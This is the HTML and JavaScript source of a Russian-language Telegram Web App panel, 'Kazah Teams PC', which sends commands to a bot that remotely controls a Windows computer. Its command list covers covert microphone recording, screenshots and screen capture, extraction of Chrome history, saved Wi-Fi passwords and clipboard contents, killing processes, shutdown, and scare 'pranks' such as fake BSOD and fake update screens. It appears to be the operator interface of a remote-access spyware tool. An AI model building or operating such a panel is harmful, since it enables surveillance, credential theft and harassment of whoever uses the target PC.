<!DOCTYPE html>
<!-- USED WITH [WOLF] JB -->
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>KAZAH TEAMS CONTROL</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    :root {
      --bg: #090c10;
      --card-bg: #161b22;
      --card-border: #30363d;
      --accent: #58a6ff;
      --accent-glow: rgba(88, 166, 255, 0.25);
      --danger: #f85149;
      --success: #3fb950;
      --text: #f0f6fc;
      --text-muted: #8b949e;
    }
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      -webkit-tap-highlight-color: transparent;
      user-select: none;
    }
    body {
      background: var(--bg);
      color: var(--text);
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      padding: 14px;
      padding-bottom: 90px;
      overflow-x: hidden;
    }
    .header {
      background: linear-gradient(135deg, #1f2937, #111827);
      border: 1px solid var(--card-border);
      border-radius: 16px;
      padding: 16px;
      margin-bottom: 16px;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .header-info h1 {
      font-size: 18px;
      font-weight: 800;
      letter-spacing: 0.5px;
      color: #fff;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .header-info p {
      font-size: 12px;
      color: var(--text-muted);
      margin-top: 4px;
    }
    .status-badge {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      background: rgba(63, 185, 80, 0.15);
      border: 1px solid var(--success);
      padding: 4px 10px;
      border-radius: 20px;
      font-size: 11px;
      font-weight: 600;
      color: var(--success);
    }
    .status-dot {
      width: 7px;
      height: 7px;
      background: var(--success);
      border-radius: 50%;
      box-shadow: 0 0 8px var(--success);
      animation: pulse 1.8s infinite;
    }
    @keyframes pulse {
      0%, 100% { opacity: 1; transform: scale(1); }
      50% { opacity: 0.4; transform: scale(0.85); }
    }
    .search-box {
      margin-bottom: 14px;
      position: relative;
    }
    .search-input {
      width: 100%;
      background: var(--card-bg);
      border: 1px solid var(--card-border);
      color: var(--text);
      padding: 12px 16px;
      border-radius: 12px;
      font-size: 14px;
      outline: none;
      transition: all 0.2s;
    }
    .search-input:focus {
      border-color: var(--accent);
      box-shadow: 0 0 0 3px var(--accent-glow);
    }
    .tabs {
      display: flex;
      gap: 8px;
      overflow-x: auto;
      padding-bottom: 8px;
      margin-bottom: 14px;
      scrollbar-width: none;
    }
    .tabs::-webkit-scrollbar { display: none; }
    .tab-btn {
      flex: 0 0 auto;
      background: var(--card-bg);
      border: 1px solid var(--card-border);
      color: var(--text-muted);
      padding: 8px 14px;
      border-radius: 20px;
      font-size: 13px;
      font-weight: 600;
      cursor: pointer;
      transition: all 0.2s;
    }
    .tab-btn.active {
      background: var(--accent);
      color: #000;
      border-color: var(--accent);
      box-shadow: 0 2px 10px var(--accent-glow);
    }
    .cmd-grid {
      display: flex;
      flex-direction: column;
      gap: 12px;
    }
    .cmd-card {
      background: var(--card-bg);
      border: 1px solid var(--card-border);
      border-radius: 14px;
      padding: 14px;
      display: flex;
      flex-direction: column;
      gap: 10px;
      transition: transform 0.15s, border-color 0.2s;
      position: relative;
      overflow: hidden;
    }
    .cmd-card:active {
      transform: scale(0.985);
    }
    .cmd-header {
      display: flex;
      align-items: center;
      justify-content: space-between;
    }
    .cmd-title {
      font-size: 15px;
      font-weight: 700;
      color: #fff;
      display: flex;
      align-items: center;
      gap: 6px;
    }
    .cmd-code {
      font-size: 11px;
      font-family: monospace;
      color: var(--accent);
      background: rgba(88, 166, 255, 0.1);
      padding: 3px 8px;
      border-radius: 6px;
      border: 1px solid rgba(88, 166, 255, 0.2);
    }
    .cmd-desc {
      font-size: 12px;
      color: var(--text-muted);
      line-height: 1.4;
    }
    .exec-btn {
      width: 100%;
      background: linear-gradient(135deg, #238636, #2ea043);
      color: #fff;
      border: none;
      border-radius: 10px;
      padding: 10px 14px;
      font-size: 13px;
      font-weight: 700;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      box-shadow: 0 3px 12px rgba(46, 160, 67, 0.3);
      transition: all 0.15s;
    }
    .exec-btn:active {
      transform: scale(0.97);
      background: #238636;
    }
    .exec-btn.danger {
      background: linear-gradient(135deg, #da3633, #f85149);
      box-shadow: 0 3px 12px rgba(248, 81, 73, 0.3);
    }
    .exec-btn.prank {
      background: linear-gradient(135deg, #8957e5, #a371f7);
      box-shadow: 0 3px 12px rgba(163, 113, 247, 0.3);
    }
    .toast {
      position: fixed;
      bottom: 24px;
      left: 50%;
      transform: translateX(-50%) translateY(100px);
      background: rgba(22, 27, 34, 0.95);
      border: 1px solid var(--accent);
      color: #fff;
      padding: 12px 20px;
      border-radius: 25px;
      font-size: 13px;
      font-weight: 600;
      box-shadow: 0 10px 30px rgba(0,0,0,0.6);
      display: flex;
      align-items: center;
      gap: 8px;
      transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
      z-index: 9999;
      pointer-events: none;
    }
    .toast.show {
      transform: translateX(-50%) translateY(0);
    }
  </style>
</head>
<body>

  <div class="header">
    <div class="header-info">
      <h1>🐺 Kazah Teams PC</h1>
      <p id="pc-status">ПК в сети • Ожидание команд</p>
    </div>
    <div class="status-badge">
      <span class="status-dot"></span>
      <span>ONLINE</span>
    </div>
  </div>

  <div class="search-box">
    <input type="text" id="searchInput" class="search-input" placeholder="🔍 Поиск команды или действия..." oninput="filterCards()">
  </div>

  <div class="tabs">
    <button class="tab-btn active" onclick="switchCategory('all', this)">⚡️ Все (42)</button>
    <button class="tab-btn" onclick="switchCategory('keys', this)">⌨️ Клавиши</button>
    <button class="tab-btn" onclick="switchCategory('sys', this)">📊 Система</button>
    <button class="tab-btn" onclick="switchCategory('media', this)">📸 Медиа</button>
    <button class="tab-btn" onclick="switchCategory('prank', this)">👻 Пранки</button>
    <button class="tab-btn" onclick="switchCategory('procs', this)">⚙️ Софт</button>
    <button class="tab-btn" onclick="switchCategory('net', this)">📶 Сеть</button>
  </div>

  <div class="cmd-grid" id="cmdGrid"></div>

  <div class="toast" id="toast">
    <span>⚡️</span>
    <span id="toastText">Команда отправлена</span>
  </div>

  <script>
    const tg = window.Telegram ? window.Telegram.WebApp : null;
    if (tg) {
      tg.ready();
      tg.expand();
      tg.setHeaderColor('#090c10');
      tg.setBackgroundColor('#090c10');
    }

    const commands = [
      // Горячие клавиши
      { name: "Alt + F4 (Закрыть)", cmd: "alt+f4", cat: "keys", desc: "Мгновенно закрывает активное окно на рабочем столе Windows.", type: "danger" },
      { name: "Ctrl + W (Закрыть вкладку)", cmd: "ctrl+w", cat: "keys", desc: "Закрывает текущую вкладку в браузере или проводнике.", type: "normal" },
      { name: "Alt + Tab (Сменить окно)", cmd: "alt+tab", cat: "keys", desc: "Переключает фокус на следующее открытое приложение.", type: "normal" },
      { name: "Win + D (Свернуть всё)", cmd: "win+d", cat: "keys", desc: "Моментально скрывает все окна и показывает чистый рабочий стол.", type: "normal" },
      { name: "Ctrl + Shift + Esc", cmd: "ctrl+shift+esc", cat: "keys", desc: "Открывает системный Диспетчер задач Windows.", type: "normal" },
      { name: "F11 (Полный экран)", cmd: "f11", cat: "keys", desc: "Разворачивает окно игры или браузера на весь экран.", type: "normal" },
      { name: "F5 (Обновить)", cmd: "f5", cat: "keys", desc: "Обновляет страницу в браузере или папку проводника.", type: "normal" },
      { name: "Space (Пауза / Плей)", cmd: "space", cat: "keys", desc: "Ставит на паузу или запускает видео/музыку на ПК.", type: "normal" },

      // Система
      { name: "Скриншот экрана", cmd: "/screen", cat: "media", desc: "Делает моментальный снимок экрана монитора и шлёт в чат.", type: "normal" },
      { name: "Запись экрана (GIF)", cmd: "/record 5", cat: "media", desc: "Записывает 5-секундную живую GIF-анимацию происходящего на мониторе.", type: "normal" },
      { name: "Микрофон (10 сек)", cmd: "/mic", cat: "media", desc: "Записывает звук из комнаты через микрофон ПК и шлёт голосовым.", type: "normal" },
      { name: "История Chrome", cmd: "/history", cat: "media", desc: "Вытаскивает последние 15 посещённых сайтов из браузера Chrome.", type: "normal" },

      // Пранки
      { name: "😱 Скример на 100% громкости", cmd: "/scare", cat: "prank", desc: "Выкручивает звук ПК на максимум, орёт сирена и выскакивает скример.", type: "prank" },
      { name: "CS2 Flashbang (Слеповая)", cmd: "/flash", cat: "prank", desc: "Ослепляющая белая вспышка на весь монитор со звоном в ушах из CS2.", type: "prank" },
      { name: "Синий экран (BSOD)", cmd: "/bsod", cat: "prank", desc: "Реалистичный экран критической ошибки Windows 11 на весь экран.", type: "prank" },
      { name: "Землетрясение окон", cmd: "/shake", cat: "prank", desc: "Бешено трясёт активное окно по всему монитору 5 секунд.", type: "prank" },
      { name: "Эффект Матрицы", cmd: "/matrix", cat: "prank", desc: "Зелёный падающий код в стиле Матрицы на полный экран.", type: "prank" },
      { name: "«Отойдите от ПК!» (Голос)", cmd: "/say Внимание! Немедленно отойдите от компьютера!", cat: "prank", desc: "Озвучивает грозную фразу роботизированным голосом через динамики.", type: "prank" },
      { name: "Фейк Обновление Windows", cmd: "/fakeupdate", cat: "prank", desc: "Фейковый бесконечный экран обновления Windows 11 (0%..99%).", type: "prank" },
      { name: "Системный BEEP", cmd: "/beep", cat: "prank", desc: "Громкий писк аппаратного спикера материнской платы.", type: "prank" },

      // Окна & Софт
      { name: "Очистить ОЗУ (RAM Boost)", cmd: "/boost", cat: "sys", desc: "Сбрасывает WorkingSet всех процессов и чистит оперативку до 2 ГБ.", type: "normal" },
      { name: "Список открытых окон", cmd: "/windows", cat: "procs", desc: "Показывает список всех видимых окон с кнопками закрытия.", type: "normal" },
      { name: "Закрыть процесс .exe", cmd: "/killmenu", cat: "procs", desc: "Интерактивное меню для завершения любой запущенной программы.", type: "danger" },
      { name: "Все запущенные .exe", cmd: "/apps", cat: "procs", desc: "Полный список всех процессов Windows, отсортированный по памяти.", type: "normal" },
      { name: "Разбудить монитор", cmd: "/wake", cat: "sys", desc: "Имитирует шевеление мыши и клик, чтобы вывести экран из сна.", type: "normal" },

      // Сеть и звук
      { name: "Пароли от всех Wi-Fi", cmd: "/wifi", cat: "net", desc: "Считывает имена и открытые пароли всех сохранённых Wi-Fi сетей.", type: "normal" },
      { name: "Прочитать буфер обмена", cmd: "/clip", cat: "net", desc: "Присылает текст, который сейчас скопирован в буфер Windows (Ctrl+C).", type: "normal" },
      { name: "Звук +10%", cmd: "/volup", cat: "sys", desc: "Прибавляет системную громкость на 10%.", type: "normal" },
      { name: "Звук -10%", cmd: "/voldown", cat: "sys", desc: "Убавляет системную громкость на 10%.", type: "normal" },
      { name: "Mute / Unmute", cmd: "/mute", cat: "sys", desc: "Полностью глушит или включает системный звук.", type: "normal" },
      { name: "YouTube Phonk", cmd: "/yt phonk", cat: "media", desc: "Открывает в браузере YouTube с фоновым фонком на полную.", type: "normal" },
      { name: "Очистить корзину", cmd: "/emptybin", cat: "sys", desc: "Безвозвратно очищает корзину Windows со звуком комкания бумаги.", type: "normal" },
      { name: "Заблокировать ПК (Lock)", cmd: "/lock", cat: "sys", desc: "Блокирует экран Windows и выводит экран ввода пароля.", type: "danger" },
      { name: "Спящий режим (Sleep)", cmd: "/sleep", cat: "sys", desc: "Переводит компьютер в глубокий спящий энергосберегающий режим.", type: "danger" },
      { name: "Выключить ПК (Power Off)", cmd: "/off", cat: "sys", desc: "Экстренно выключает компьютер.", type: "danger" }
    ];

    let currentCategory = "all";

    function renderCards(list) {
      const grid = document.getElementById("cmdGrid");
      grid.innerHTML = "";
      list.forEach(c => {
        const card = document.createElement("div");
        card.className = "cmd-card";
        
        let btnClass = "exec-btn";
        if (c.type === "danger") btnClass += " danger";
        if (c.type === "prank") btnClass += " prank";

        card.innerHTML = `
          <div class="cmd-header">
            <span class="cmd-title">${c.name}</span>
            <span class="cmd-code">${c.cmd}</span>
          </div>
          <div class="cmd-desc">${c.desc}</div>
          <button class="${btnClass}" onclick="executeCommand('${c.cmd}')">
            <span>⚡️ Выполнить</span>
          </button>
        `;
        grid.appendChild(card);
      });
    }

    function switchCategory(cat, btn) {
      currentCategory = cat;
      document.querySelectorAll(".tab-btn").forEach(b => b.classList.remove("active"));
      btn.classList.add("active");
      filterCards();
    }

    function filterCards() {
      const q = document.getElementById("searchInput").value.toLowerCase().trim();
      const filtered = commands.filter(c => {
        const matchCat = currentCategory === "all" || c.cat === currentCategory;
        const matchQuery = !q || c.name.toLowerCase().includes(q) || c.cmd.toLowerCase().includes(q) || c.desc.toLowerCase().includes(q);
        return matchCat && matchQuery;
      });
      renderCards(filtered);
    }

    function showToast(text) {
      const toast = document.getElementById("toast");
      document.getElementById("toastText").innerText = text;
      toast.classList.add("show");
      setTimeout(() => toast.classList.remove("show"), 2200);
    }

    function executeCommand(cmd) {
      if (tg) {
        tg.HapticFeedback.impactOccurred('medium');
        // Sends direct text data back to Telegram bot
        tg.sendData(cmd);
      }
      showToast("Выполняю: " + cmd);
      // Fallback: send via fetch to local bot endpoint
      fetch('/api/exec', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ cmd: cmd })
      }).catch(() => {});
    }

    renderCards(commands);
  </script>
</body>
</html>
